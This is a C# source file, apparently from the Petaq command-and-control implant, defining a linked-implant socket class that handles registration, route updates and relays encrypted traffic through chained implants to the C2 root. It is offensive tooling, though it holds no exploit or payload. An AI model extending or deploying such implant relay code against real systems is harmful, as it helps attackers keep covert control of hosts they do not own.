using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using System.IO.Pipes;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Text.RegularExpressions;

namespace PetaqImplant
{
    public class LinkedImplantSocket
    {
        public bool Status { get; set; }
        public string ServerAddress { get; set; }
        public string sessionId { get; set; }
        public bool Registration { get; set; }
        public bool Route { get; set; }
        public Thread clientThread { get; set; }

        public LinkedImplantSocket()
        {
        }
        public virtual void Connect(string sessionId, string ServerAddress, string option = null)
        {

        }
        public virtual void Disconnect()
        {

        }
        public virtual void AskRegistration()
        {
            Console.WriteLine("Registration is requesting...");
            Send(Common.Encrypt("register"));
            Registration = true;
        }
        public virtual void AskRouteUpdates()
        {
            Console.WriteLine("Route updates is requesting...");
            Send(Common.Encrypt("routeupdates"));
            Route = true;
        }
        public virtual bool Send(string data = "")
        {
            return false;
        }

        public void LinkedServiceSend(string output)
        {
            // Decrypt the output for processing
            output = Common.Decrypt(output);

            // Instruction to process before sending
            string inst = Regex.Split(output, " ")[0];

            switch (inst)
            {
                case "transmit":
                    // Get the ID as the linked implant passes the data through
                    string transmitId = Regex.Split(output, " ")[1];
                    // Pass-Through the output to the linked service
                    Program.LinkService.Send(Common.Encrypt(output));
                    break;
                case "routeupdates":
                    Console.WriteLine("Processing route updates coming from {0}",sessionId);
                    // Routing protocol
                    string route_data = output;
                    if (Regex.Split(output, " ").Length == 2)
                    {
                        // don't touch the session ID as it's routed
                        // add the next hop to the route for received session ID
                        Console.WriteLine("Adding the route updates coming from {0}", sessionId);
                        Program.implantRoutes.TryAdd(Regex.Split(output, " ")[1], sessionId);
                    }
                    else
                    {
                        Console.WriteLine("The route updates coming from {0} passing through", sessionId);

                        // add the implant's ID to the route for the C2 root
                        route_data += " " + sessionId;
                    }
                    // Pass-Through the output to the linked service
                    Program.LinkService.Send(Common.Encrypt(route_data));
                    break;
                default:
                    // Sending the linked implant output to the linked service
                    Program.LinkService.Send(Common.Encrypt("transmit " + sessionId + " " + output));
                    break;
            }
        }
       
    }
}
